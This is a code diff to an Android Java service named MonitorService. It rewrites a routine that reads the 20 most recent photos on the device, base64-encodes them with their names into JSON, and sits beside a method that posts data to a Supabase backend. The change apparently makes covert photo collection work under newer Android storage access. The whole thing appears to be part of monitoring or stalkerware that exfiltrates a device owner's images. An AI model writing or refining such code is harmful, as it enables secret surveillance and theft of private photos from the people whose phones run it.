@@ -4,9 +4,11 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ContentUris;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -21,11 +23,11 @@ import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.io.File;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.file.Files;
 import java.util.Base64;
 
 public class MonitorService extends Service {
@@ -163,20 +165,25 @@ public class MonitorService extends Service {
 
         try {
             Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                    new String[]{MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME},
+                    new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME},
                     null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
             if (cursor != null) {
                 while (cursor.moveToNext()) {
-                    String path = cursor.getString(0);
-                    String name = cursor.getString(1);
-                    File file = new File(path);
-                    if (file.exists()) {
-                        byte[] imageData = Files.readAllBytes(file.toPath());
-                        String base64 = Base64.getEncoder().encodeToString(imageData);
-                        JSONObject photo = new JSONObject();
-                        photo.put("name", name);
-                        photo.put("data", base64);
-                        photoList.put(photo);
+                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
+                    Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+
+                    try (InputStream is = getContentResolver().openInputStream(uri)) {
+                        if (is != null) {
+                            byte[] imageData = readAllBytes(is);
+                            String base64 = Base64.getEncoder().encodeToString(imageData);
+                            JSONObject photo = new JSONObject();
+                            photo.put("name", name);
+                            photo.put("data", base64);
+                            photoList.put(photo);
+                        }
+                    } catch (Exception e) {
+                        Log.e("getPhotos", "ছবি পড়তে ব্যর্থ: " + name, e);
                     }
                 }
                 cursor.close();
@@ -185,6 +192,16 @@ public class MonitorService extends Service {
             Log.e("getPhotos", e.toString());
         }
         return photoList;
+    }
+
+    private byte[] readAllBytes(InputStream is) throws Exception {
+        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+        byte[] data = new byte[8192];
+        int nRead;
+        while ((nRead = is.read(data, 0, data.length)) != -1) {
+            buffer.write(data, 0, nRead);
+        }
+        return buffer.toByteArray();
     }
 
     private void postToSupabase(String endpoint, String jsonData) throws Exception {
